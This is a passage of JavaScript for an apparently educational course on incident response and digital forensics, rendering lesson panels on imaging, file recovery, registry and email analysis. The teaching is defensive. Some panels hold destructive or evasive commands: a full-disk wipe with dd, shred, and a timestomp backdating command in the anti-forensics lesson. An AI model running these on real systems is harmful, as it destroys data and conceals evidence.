                <button class="demo-btn demo-btn-sm active" data-t="phases">6 Phases</button>
                <button class="demo-btn demo-btn-sm" data-t="playbook">Playbook</button>
                <button class="demo-btn demo-btn-sm" data-t="tips">Quick Tips</button>
            </div>
            <div id="irOut" style="background:#1a1a1a;color:#ff6b6b;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            phases: 'INCIDENT RESPONSE PHASES (NIST):\n\n┌─────────────────────────────────────┐\n│ 1. PREPARATION                      │\n│    • IR plan documented             │\n│    • Team trained                   │\n│    • Tools ready                    │\n├─────────────────────────────────────┤\n│ 2. DETECTION & ANALYSIS             │\n│    • Identify the incident          │\n│    • Determine scope & impact       │\n│    • Document everything            │\n├─────────────────────────────────────┤\n│ 3. CONTAINMENT                      │\n│    • Short-term: Stop bleeding      │\n│    • Long-term: Prepare eradication │\n├─────────────────────────────────────┤\n│ 4. ERADICATION                      │\n│    • Remove threat                  │\n│    • Patch vulnerabilities          │\n├─────────────────────────────────────┤\n│ 5. RECOVERY                         │\n│    • Restore systems                │\n│    • Validate security              │\n├─────────────────────────────────────┤\n│ 6. LESSONS LEARNED                  │\n│    • Post-incident review           │\n│    • Improve defenses               │\n└─────────────────────────────────────┘',
            playbook: 'RANSOMWARE RESPONSE PLAYBOOK:\n\n🚨 DETECTION:\n   Alert: Encrypted files detected\n   Indicators: .encrypted extension\n   Ransom note found\n\n🔒 CONTAINMENT (FIRST 15 MIN):\n   ☐ Isolate affected systems\n   ☐ Disable network shares\n   ☐ Block C2 IPs at firewall\n   ☐ Preserve memory image\n   ☐ DO NOT reboot!\n\n🔍 ANALYSIS:\n   ☐ Identify ransomware strain\n   ☐ Check nomoreransom.org\n   ☐ Determine entry point\n   ☐ Scope affected systems\n\n🧹 ERADICATION:\n   ☐ Remove malware artifacts\n   ☐ Patch entry vulnerability\n   ☐ Reset compromised credentials\n\n🔄 RECOVERY:\n   ☐ Restore from clean backups\n   ☐ Rebuild if no backup\n   ☐ Verify system integrity\n\n⚠️ NEVER PAY RANSOM (encourages attacks)',
            tips: 'INCIDENT RESPONSE QUICK TIPS:\n\n⏰ TIME IS CRITICAL:\n   • Evidence degrades over time\n   • Memory is volatile\n   • Attackers may be active\n\n📋 DOCUMENT EVERYTHING:\n   • Screenshots\n   • Timestamps\n   • Actions taken\n   • Who did what\n\n🔒 PRESERVE EVIDENCE:\n   • Image before cleaning\n   • Capture memory first\n   • Calculate hashes\n   • Maintain chain of custody\n\n📞 COMMUNICATION:\n   • Know who to call\n   • Legal/PR involvement\n   • Law enforcement (if needed)\n   • Breach notification laws\n\n❌ COMMON MISTAKES:\n   • Rebooting infected systems\n   • Running AV immediately\n   • Deleting evidence\n   • Acting alone\n   • Not documenting\n\n🎯 GOLDEN RULE:\n   "Do no harm" - Don\'t make it worse!'
        };
        $('#irOut').textContent = data.phases;
        $$('#irTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#irTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#irOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 43: security-teams-forensics - Security Teams in Forensics
    function demoSecurityTeamsForensics(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">TEAMS</span><span class="demo-title">Security Teams in Forensics</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="teamsTabs">
                <button class="demo-btn demo-btn-sm active" data-t="roles">Team Roles</button>
                <button class="demo-btn demo-btn-sm" data-t="soc">SOC Structure</button>
                <button class="demo-btn demo-btn-sm" data-t="certs">Certifications</button>
            </div>
            <div id="teamsOut" style="background:#1a1a2e;color:#69f0ae;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            roles: 'FORENSICS TEAM ROLES:\n\n┌─────────────────────────────────────┐\n│ INCIDENT RESPONDER                  │\n│ • First to investigate              │\n│ • Triage and contain                │\n│ • Initial evidence collection       │\n├─────────────────────────────────────┤\n│ DIGITAL FORENSIC ANALYST            │\n│ • Detailed evidence analysis        │\n│ • Disk/memory forensics             │\n│ • Malware analysis                  │\n├─────────────────────────────────────┤\n│ FORENSIC EXAMINER                   │\n│ • Court-ready analysis              │\n│ • Expert witness testimony          │\n│ • Report writing                    │\n├─────────────────────────────────────┤\n│ THREAT HUNTER                       │\n│ • Proactive threat detection        │\n│ • IOC development                   │\n│ • Attack pattern analysis           │\n├─────────────────────────────────────┤\n│ MALWARE ANALYST                     │\n│ • Reverse engineering               │\n│ • Behavioral analysis               │\n│ • IOC extraction                    │\n└─────────────────────────────────────┘',
            soc: 'SOC (Security Operations Center):\n\n┌─────────────────────────────────────┐\n│         SOC STRUCTURE               │\n├─────────────────────────────────────┤\n│ TIER 1: Alert Analysts              │\n│ • Monitor SIEM alerts               │\n│ • Initial triage                    │\n│ • Escalate to Tier 2                │\n├─────────────────────────────────────┤\n│ TIER 2: Incident Responders         │\n│ • Deep investigation                │\n│ • Containment actions               │\n│ • Coordinate response               │\n├─────────────────────────────────────┤\n│ TIER 3: Threat Hunters/Forensics    │\n│ • Advanced analysis                 │\n│ • Malware reverse engineering       │\n│ • Threat intelligence               │\n├─────────────────────────────────────┤\n│ SOC MANAGER                         │\n│ • Team leadership                   │\n│ • Process improvement               │\n│ • Stakeholder communication         │\n└─────────────────────────────────────┘',
            certs: 'FORENSICS CERTIFICATIONS:\n\n🔵 ENTRY LEVEL:\n   • CompTIA Security+\n   • CompTIA CySA+\n   • BTL1 (Blue Team Level 1)\n\n🟢 INTERMEDIATE:\n   • GCFE (GIAC Forensic Examiner)\n   • GCIH (GIAC Incident Handler)\n   • CHFI (EC-Council)\n   • eCDFP (eLearnSecurity)\n\n🟡 ADVANCED:\n   • GCFA (GIAC Forensic Analyst)\n   • GNFA (Network Forensics)\n   • GREM (Reverse Engineering)\n   • EnCE (EnCase Certified)\n   • ACE (AccessData/Exterro)\n\n🔴 EXPERT:\n   • GXPN (Exploit Researcher)\n   • OSCP/OSEP (Offensive Security)\n   • CCE (Certified Computer Examiner)\n\n🎯 RECOMMENDATION PATH:\n   Security+ → CySA+ → GCFE → GCFA\n\n💡 SANS courses are gold standard\n   but expensive (~$7000-9000)'
        };
        $('#teamsOut').textContent = data.roles;
        $$('#teamsTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#teamsTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#teamsOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 44: fs-forensics-intro - File System Forensics Introduction
    function demoFSForensicsIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">FS</span><span class="demo-title">File System Forensics Intro</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="fsTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What Is It?</button>
                <button class="demo-btn demo-btn-sm" data-t="types">FS Types</button>
                <button class="demo-btn demo-btn-sm" data-t="artifacts">Artifacts</button>
            </div>
            <div id="fsOut" style="background:#1e1e1e;color:#dcdcaa;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'FILE SYSTEM FORENSICS:\n\nAnalyzing storage media to recover\nevidence from files and metadata.\n\n┌─────────────────────────────────────┐\n│ WHAT CAN WE FIND?                   │\n├─────────────────────────────────────┤\n│ • Active files                      │\n│ • Deleted files (recoverable!)      │\n│ • File metadata (timestamps)        │\n│ • Slack space data                  │\n│ • Alternate data streams            │\n│ • Hidden partitions                 │\n│ • Encrypted volumes                 │\n└─────────────────────────────────────┘\n\nWHY FILE SYSTEMS MATTER:\n  Delete ≠ Gone!\n  Formatting ≠ Erased!\n  Data persists until overwritten\n\nKEY CONCEPTS:\n  • MBR/GPT partition tables\n  • Cluster allocation\n  • File slack (wasted space)\n  • Unallocated space',
            types: 'FILE SYSTEM TYPES:\n\n📁 NTFS (Windows):\n   • Default for Windows\n   • MFT (Master File Table)\n   • ADS (Alternate Data Streams)\n   • $LogFile, $UsnJrnl journals\n\n📁 FAT32/exFAT:\n   • USB drives, SD cards\n   • Simple structure\n   • No journaling\n   • FAT (File Allocation Table)\n\n📁 EXT4 (Linux):\n   • Default for Linux\n   • Superblock, inode table\n   • Journal for recovery\n   • Extended attributes\n\n📁 APFS (macOS):\n   • Apple File System\n   • Snapshots, cloning\n   • Strong encryption\n   • Container-based\n\n📁 HFS+ (Legacy macOS):\n   • Hierarchical File System\n   • Catalog file, extents\n   • Being replaced by APFS',
            artifacts: 'FILE SYSTEM ARTIFACTS:\n\nNTFS ARTIFACTS:\n  $MFT      - File metadata (all files)\n  $LogFile  - Transaction journal\n  $UsnJrnl  - Change journal\n  $I30      - Directory indexes\n  $Bitmap   - Cluster allocation\n\nWINDOWS ARTIFACTS:\n  Prefetch  - App execution history\n  LNK files - Shortcuts (timestamps!)\n  Thumbs.db - Image thumbnails\n  $Recycle.Bin - Deleted files\n  SRUDB.dat - Resource usage\n\nLINUX ARTIFACTS:\n  /var/log/ - System logs\n  .bash_history - Command history\n  /tmp/     - Temporary files\n  .trash/   - Deleted files\n\n🎯 TIMESTAMPS:\n   M - Modified (content changed)\n   A - Accessed (read)\n   C - Changed ($MFT entry changed)\n   B - Born (created) [NTFS only]\n   \n   MACB times = Forensic gold!'
        };
        $('#fsOut').textContent = data.what;
        $$('#fsTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#fsTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#fsOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 45: file-system-analysis - File System Analysis
    function demoFileSystemAnalysis(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">ANALYZE</span><span class="demo-title">File System Analysis</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="fsAnalysisTabs">
                <button class="demo-btn demo-btn-sm active" data-t="sleuth">Sleuth Kit</button>
                <button class="demo-btn demo-btn-sm" data-t="timeline">Timeline</button>
                <button class="demo-btn demo-btn-sm" data-t="carving">Carving</button>
            </div>
            <div id="fsAnalysisOut" style="background:#0d1117;color:#79c0ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            sleuth: 'THE SLEUTH KIT (TSK):\n\nCommand-line forensic tools\n\n# Analyze partition table\n$ mmls disk.dd\n  Slot  Start        End          Length\n  00    0000000063   0000001953   0000001890\n  01    0000002048   0041943039   0041940992\n\n# List files in partition\n$ fls -o 2048 disk.dd\nr/r 4:  $MFT\nr/r 8:  $BadClus\nd/d 25: Documents\nd/d 26: Downloads\n\n# Get file content by inode\n$ icat -o 2048 disk.dd 25-128-1 > extracted.doc\n\n# File system info\n$ fsstat -o 2048 disk.dd\n  File System Type: NTFS\n  Volume Name: Windows\n  Cluster Size: 4096\n\n# Deleted files\n$ fls -d -o 2048 disk.dd\n* r/r 1234: deleted_secret.txt',
            timeline: 'FORENSIC TIMELINE ANALYSIS:\n\n# Using log2timeline (Plaso)\n\n# Create timeline from image\n$ log2timeline.py timeline.plaso disk.dd\n\n# Filter and export\n$ psort.py -o l2tcsv timeline.plaso \\\n    "date > \'2024-01-01\'" > timeline.csv\n\n# View in Timesketch (web UI)\n\nTIMELINE OUTPUT:\n┌───────────────────────────────────┐\n│ 2024-01-15 14:30:22 │ File Created│\n│ Documents/secret.docx             │\n├───────────────────────────────────┤\n│ 2024-01-15 14:35:10 │ File Modified\n│ Documents/secret.docx             │\n├───────────────────────────────────┤\n│ 2024-01-15 14:40:55 │ USB Connected\n│ USBSTOR\\Disk&Ven_SanDisk          │\n├───────────────────────────────────┤\n│ 2024-01-15 14:41:30 │ File Copied │\n│ E:\\secret.docx                    │\n└───────────────────────────────────┘',
            carving: 'FILE CARVING:\n\nRecovering files from unallocated\nspace based on file signatures.\n\n# Photorec (interactive)\n$ photorec disk.dd\n  [Partition] → [File types] → [Search!]\n  \n# Scalpel (config-based)\n$ cat /etc/scalpel/scalpel.conf\n  jpg y 200000000 \\xff\\xd8\\xff \\xff\\xd9\n  pdf y 5000000   %PDF %EOF\n  doc y 10000000  \\xd0\\xcf\\x11\\xe0\n\n$ scalpel -c scalpel.conf disk.dd -o output/\n\n# Foremost\n$ foremost -t all -i disk.dd -o carved/\n\nFILE SIGNATURES (Magic Bytes):\n  JPEG: FF D8 FF\n  PNG:  89 50 4E 47\n  PDF:  25 50 44 46 (%PDF)\n  ZIP:  50 4B 03 04\n  EXE:  4D 5A (MZ)\n\n⚠️ Carved files may be incomplete\n   No filename recovery'
        };
        $('#fsAnalysisOut').textContent = data.sleuth;
        $$('#fsAnalysisTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#fsAnalysisTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#fsAnalysisOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 46: disk-capture - Disk Capture/Imaging
    function demoDiskCapture(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">IMAGE</span><span class="demo-title">Disk Capture/Imaging</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="diskCapTabs">
                <button class="demo-btn demo-btn-sm active" data-t="formats">Image Formats</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Tools</button>
                <button class="demo-btn demo-btn-sm" data-t="process">Process</button>
            </div>
            <div id="diskCapOut" style="background:#1a1a1a;color:#ffa726;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            formats: 'FORENSIC IMAGE FORMATS:\n\n┌─────────────────────────────────────┐\n│ RAW (dd)                            │\n│ • Exact bit-for-bit copy            │\n│ • No compression                    │\n│ • Universally supported             │\n│ • Large file sizes                  │\n├─────────────────────────────────────┤\n│ E01 (EnCase)                        │\n│ • Industry standard                 │\n│ • Compression supported             │\n│ • Built-in hashing                  │\n│ • Case metadata                     │\n│ • Splits into segments              │\n├─────────────────────────────────────┤\n│ AFF (Advanced Forensic Format)      │\n│ • Open source                       │\n│ • Metadata support                  │\n│ • Less common today                 │\n├─────────────────────────────────────┤\n│ VMDK/VHD                            │\n│ • Virtual machine disks             │\n│ • Can mount directly                │\n└─────────────────────────────────────┘',
            tools: 'DISK IMAGING TOOLS:\n\nGUI TOOLS:\n  FTK Imager (Free, Windows)\n  • User-friendly\n  • E01, SMART, DD formats\n  • Memory capture\n  • Preview before imaging\n\nCLI TOOLS:\n  # Basic dd\n  $ dd if=/dev/sdb of=evidence.dd bs=4M\n  \n  # dc3dd (forensic dd)\n  $ dc3dd if=/dev/sdb of=evidence.dd \\\n      hash=sha256 log=imaging.log\n  \n  # ewfacquire (E01 format)\n  $ ewfacquire /dev/sdb\n  \n  # Guymager (Linux GUI)\n  $ guymager\n\nHARDWARE:\n  • Write blockers (MANDATORY)\n  • Tableau forensic bridges\n  • Wiebetech devices\n\n⚠️ ALWAYS use write blocker!\n   One accidental write = \n   Evidence contaminated',
            process: 'DISK IMAGING PROCESS:\n\n1. PREPARE\n   ☐ Document original state\n   ☐ Photograph drive\n   ☐ Record serial numbers\n   ☐ Connect write blocker\n\n2. ACQUIRE\n   ☐ Verify write blocker active\n   ☐ Select target destination\n   ☐ Start imaging process\n   ☐ Monitor for errors\n\n3. VERIFY\n   ☐ Compare source/dest hashes\n   ☐ Document hash values\n   ☐ Create second copy\n\nDC3DD EXAMPLE:\n$ dc3dd if=/dev/sdb of=evidence.dd \\\n    hash=sha256 hash=md5 \\\n    hlog=hashes.txt \\\n    log=imaging.log \\\n    verb=on\n\nOUTPUT:\nInput:   2000398934016 bytes\nOutput:  2000398934016 bytes\nMD5:     a7f8e3c9b2d4f6a8e0c2d4f6\nSHA256:  4f8a2b6c8d0e2f4a6b8c0d2e...\nMATCH: YES ✓'
        };
        $('#diskCapOut').textContent = data.formats;
        $$('#diskCapTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#diskCapTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#diskCapOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 47: deleted-file-recovery - Deleted File Recovery
    function demoDeletedFileRecovery(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">RECOVER</span><span class="demo-title">Deleted File Recovery</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="deleteTabs">
                <button class="demo-btn demo-btn-sm active" data-t="how">How Deletion Works</button>
                <button class="demo-btn demo-btn-sm" data-t="recover">Recovery</button>
                <button class="demo-btn demo-btn-sm" data-t="secure">Secure Delete</button>
            </div>
            <div id="deleteOut" style="background:#1e1e1e;color:#66bb6a;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            how: 'HOW FILE DELETION WORKS:\n\n┌─────────────────────────────────────┐\n│ BEFORE DELETE:                      │\n│                                     │\n│ File System Table:                  │\n│   secret.txt → Cluster 1234         │\n│                   ↓                 │\n│             [DATA HERE]             │\n├─────────────────────────────────────┤\n│ AFTER "DELETE":                     │\n│                                     │\n│ File System Table:                  │\n│   (entry removed/marked deleted)    │\n│                   ↓                 │\n│             [DATA STILL HERE!]      │\n│   ↑ Cluster marked as "available"   │\n└─────────────────────────────────────┘\n\nKEY INSIGHT:\n  "Delete" only removes the pointer\n  Data remains until overwritten!\n\nRECOVERY WINDOW:\n  Depends on disk activity\n  SSD TRIM reduces recovery chances',
            recover: 'FILE RECOVERY METHODS:\n\nMETHOD 1: Metadata Recovery\n  File system still has partial info\n\n  # Sleuth Kit - list deleted files\n  $ fls -d -r disk.dd\n  * r/r 45-128-3: secret.txt\n\n  # Recover by inode\n  $ icat disk.dd 45 > recovered.txt\n\nMETHOD 2: File Carving\n  Search by file signatures\n\n  $ photorec disk.dd\n  $ foremost -i disk.dd -o output/\n\nMETHOD 3: Recycle Bin\n  Windows: C:\\$Recycle.Bin\n  \n  $I files: Original path info\n  $R files: Actual file content\n\nAUTOPSY RECOVERY:\n  1. Add data source\n  2. View > Deleted Files\n  3. Right-click > Extract\n\n⚠️ Don\'t write to evidence drive!\n   Recovery writes = Evidence destroyed',
            secure: 'SECURE FILE DELETION:\n\nIf deleted files are recoverable,\nhow do you ACTUALLY delete data?\n\n┌─────────────────────────────────────┐\n│ SECURE DELETION METHODS             │\n├─────────────────────────────────────┤\n│ OVERWRITING:                        │\n│   Write random/zero data over file  │\n│   $ shred -vfz -n 3 secret.txt      │\n│   $ sdelete secret.txt (Windows)    │\n├─────────────────────────────────────┤\n│ FULL DISK WIPE:                     │\n│   $ dd if=/dev/urandom of=/dev/sdb  │\n│   DBAN boot disk                    │\n├─────────────────────────────────────┤\n│ PHYSICAL DESTRUCTION:               │\n│   Degaussing (magnetic)             │\n│   Shredding (physical)              │\n│   Incineration                      │\n└─────────────────────────────────────┘\n\nSSD CONSIDERATIONS:\n  TRIM makes recovery harder\n  But wear leveling complicates wiping\n  Full disk encryption + destroy key\n  is most reliable for SSDs'
        };
        $('#deleteOut').textContent = data.how;
        $$('#deleteTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#deleteTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#deleteOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 48: email-forensics - Email Forensics
    function demoEmailForensics(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">EMAIL</span><span class="demo-title">Email Forensics</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="emailForTabs">
                <button class="demo-btn demo-btn-sm active" data-t="headers">Headers</button>
                <button class="demo-btn demo-btn-sm" data-t="artifacts">Artifacts</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Tools</button>
            </div>
            <div id="emailForOut" style="background:#0d1117;color:#8b949e;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            headers: 'EMAIL HEADER ANALYSIS:\n\nKEY HEADERS (read bottom to top):\n\nReceived: from mail.example.com\n  by mx.google.com\n  for <victim@gmail.com>;\n  Mon, 15 Jan 2024 10:30:22 -0800\n  ↑ Each server adds Received header\n\nFrom: "CEO" <ceo@example.com>\n  ↑ Can be spoofed!\n\nReturn-Path: <attacker@malicious.com>\n  ↑ Actual sender (harder to spoof)\n\nX-Originating-IP: [192.168.1.100]\n  ↑ Sender\'s IP (if present)\n\nMessage-ID: <unique-id@server.com>\n  ↑ Unique identifier\n\nDKIM-Signature: v=1; d=example.com\n  ↑ Cryptographic verification\n\nAuthentication-Results:\n  spf=pass dkim=pass dmarc=pass\n  ↑ Email authentication status',
            artifacts: 'EMAIL FORENSIC ARTIFACTS:\n\nOUTLOOK (Windows):\n  OST: Offline cache\n    %LOCALAPPDATA%\\Microsoft\\Outlook\\\n  PST: Archive/exported\n    User-specified location\n\nTHUNDERBIRD:\n  MBOX format\n    %APPDATA%\\Thunderbird\\Profiles\\\n\nWEBMAIL:\n  Browser artifacts:\n    • Cache (temporary copies)\n    • History (accessed URLs)\n    • Cookies (session info)\n  \nMOBILE:\n  • SQLite databases\n  • iOS: Mail.app folders\n  • Android: Provider-specific\n\nKEY EVIDENCE:\n  • Sent/Received timestamps\n  • Attachments (hashes!)\n  • Thread relationships\n  • Deleted emails\n  • Headers (routing info)',
            tools: 'EMAIL FORENSIC TOOLS:\n\nPST/OST ANALYSIS:\n  • Kernel PST Viewer (free)\n  • pffexport (command line)\n  • Autopsy email parser\n\n  $ pffexport outlook.pst\n  $ ls outlook.pst.export/\n    Inbox/ Sent/ Deleted/\n\nMBOX ANALYSIS:\n  • mboxgrep (search)\n  • Thunderbird (viewer)\n\n  $ mboxgrep -m "password" mbox\n\nHEADER ANALYSIS:\n  • MXToolbox Header Analyzer\n  • Google Admin Toolbox\n  • emailheaders.net\n\nFULL ANALYSIS:\n  • Autopsy (email module)\n  • FTK (email support)\n  • MailXaminer (dedicated)\n\nPYTHON PARSING:\n  import email\n  msg = email.message_from_file(f)\n  print(msg[\'From\'], msg[\'Subject\'])'
        };
        $('#emailForOut').textContent = data.headers;
        $$('#emailForTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#emailForTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#emailForOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 49: windows-registry-forensics - Windows Registry Forensics
    function demoWindowsRegistryForensics(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">REGISTRY</span><span class="demo-title">Windows Registry Forensics</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="regTabs">
                <button class="demo-btn demo-btn-sm active" data-t="hives">Hives</button>
                <button class="demo-btn demo-btn-sm" data-t="artifacts">Key Artifacts</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Tools</button>
            </div>
            <div id="regOut" style="background:#1a1a1a;color:#ce9178;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            hives: 'WINDOWS REGISTRY HIVES:\n\nLocation: C:\\Windows\\System32\\config\\\n\n┌─────────────────────────────────────┐\n│ HIVE FILE    │ CONTAINS             │\n├─────────────────────────────────────┤\n│ SAM          │ Local user accounts  │\n│              │ Password hashes      │\n├─────────────────────────────────────┤\n│ SECURITY     │ Security policies    │\n│              │ LSA secrets          │\n├─────────────────────────────────────┤\n│ SOFTWARE     │ Installed software   │\n│              │ System config        │\n├─────────────────────────────────────┤\n│ SYSTEM       │ Hardware config      │\n│              │ Services, drivers    │\n├─────────────────────────────────────┤\n│ NTUSER.DAT   │ User preferences     │\n│ (per user)   │ Recent files, MRUs   │\n├─────────────────────────────────────┤\n│ USRCLASS.DAT │ User shellbags       │\n│              │ COM settings         │\n└─────────────────────────────────────┘',
            artifacts: 'KEY FORENSIC ARTIFACTS:\n\nUSER ACTIVITY:\n  RecentDocs - Recently opened files\n    NTUSER\\Software\\Microsoft\\Windows\\\n      CurrentVersion\\Explorer\\RecentDocs\n\n  TypedPaths - Explorer address bar\n    ...\\Explorer\\TypedPaths\n\n  UserAssist - Program execution (ROT13!)\n    ...\\Explorer\\UserAssist\n\nPROGRAM EXECUTION:\n  Run keys - Auto-start programs\n    SOFTWARE\\Microsoft\\Windows\\\n      CurrentVersion\\Run\n\n  AppCompatCache - Executed programs\n    SYSTEM\\CurrentControlSet\\Control\\\n      Session Manager\\AppCompatCache\n\nUSB HISTORY:\n  USBSTOR - Connected USB devices\n    SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\n\n  MountedDevices - Drive letters\n    SYSTEM\\MountedDevices',
            tools: 'REGISTRY FORENSIC TOOLS:\n\nREGRIPPER (CLI):\n  $ rip.pl -r NTUSER.DAT -p recentdocs\n  $ rip.pl -r SYSTEM -p usbstor\n  \n  Plugins for specific artifacts\n  Output: Parsed, readable data\n\nREGISTRY EXPLORER (GUI):\n  Eric Zimmerman tool\n  • Visual hive browsing\n  • Timestamp analysis\n  • Deleted key recovery\n  • Bookmarking\n\nAUTOPSY:\n  Recent Activity module\n  • Auto-parses registry\n  • Timeline integration\n\nFORENSIC MOUNT:\n  # Linux - mount hive\n  $ hivexsh NTUSER.DAT\n  > cd \\Software\\Microsoft\n  > ls\n  > cat key_name\n\nPYTHON:\n  from Registry import Registry\n  reg = Registry.Registry("NTUSER.DAT")\n  key = reg.open("Software\\\\Microsoft")'
        };
        $('#regOut').textContent = data.hives;
        $$('#regTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#regTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#regOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 50: anti-forensics - Anti-Forensics
    function demoAntiForensics(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EVASION</span><span class="demo-title">Anti-Forensics Techniques</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="antiTabs">
                <button class="demo-btn demo-btn-sm active" data-t="techniques">Techniques</button>
                <button class="demo-btn demo-btn-sm" data-t="detect">Detection</button>
                <button class="demo-btn demo-btn-sm" data-t="defense">Defense</button>
            </div>
            <div id="antiOut" style="background:#1a1a1a;color:#f44336;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            techniques: 'ANTI-FORENSICS TECHNIQUES:\n\n🗑️ DATA DESTRUCTION:\n   • Secure file deletion (shred)\n   • Disk wiping (DBAN)\n   • Log clearing\n   • Browser history deletion\n\n🔒 DATA HIDING:\n   • Steganography\n   • Alternate Data Streams (NTFS)\n   • Slack space hiding\n   • Encrypted volumes\n   • Hidden partitions\n\n⏰ TIMESTAMP MANIPULATION:\n   • Timestomping (change MACB)\n   • Backdating files\n   # timestomp.exe file.exe -m "01/01/2020 12:00:00"\n\n🎭 OBFUSCATION:\n   • Code obfuscation\n   • Packed executables\n   • Fileless malware\n   • Living-off-the-land\n\n🔄 ARTIFACT MANIPULATION:\n   • Event log clearing\n   • Registry key deletion\n   • Prefetch disabling\n   • MFT manipulation',
            detect: 'DETECTING ANTI-FORENSICS:\n\n🔍 TIMESTAMP ANALYSIS:\n   $MFT vs $STDINFO timestamps\n   If $MFT created > $SI created\n   → Timestomping detected!\n\n   Tool: MFTECmd (Zimmerman)\n\n🔍 LOG GAPS:\n   Security Event ID 1102\n   "The audit log was cleared"\n\n   Missing time ranges\n   in otherwise continuous logs\n\n🔍 TOOL ARTIFACTS:\n   Anti-forensic tools leave traces:\n   • CCleaner registry entries\n   • Eraser scheduled tasks\n   • BleachBit temp files\n\n🔍 STATISTICAL ANOMALIES:\n   • Unusual file distributions\n   • Missing expected artifacts\n   • Inconsistent metadata\n\n🔍 MEMORY ANALYSIS:\n   Tools loaded in memory\n   Even if disk is wiped',
